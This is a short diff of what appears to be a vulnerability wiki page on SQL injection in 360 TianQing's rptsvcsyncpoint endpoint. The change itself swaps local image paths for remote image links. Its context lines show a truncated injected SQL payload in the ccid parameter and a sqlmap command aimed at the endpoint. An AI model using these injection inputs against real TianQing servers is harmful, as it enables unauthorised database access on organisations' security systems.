@@ -36,7 +36,7 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT
 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
 ```
 
-![](image/tq-1.png)
+![](http://wikioss.peiqi.tech/vuln/tq-1.png)
 
 ## Goby & POC
 
@@ -46,4 +46,4 @@ sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms Post
 >
 > 360 TianQing ccid SQL injectable
 
-![](image/tq-3.png)
+![](http://wikioss.peiqi.tech/vuln/tq-3.png)
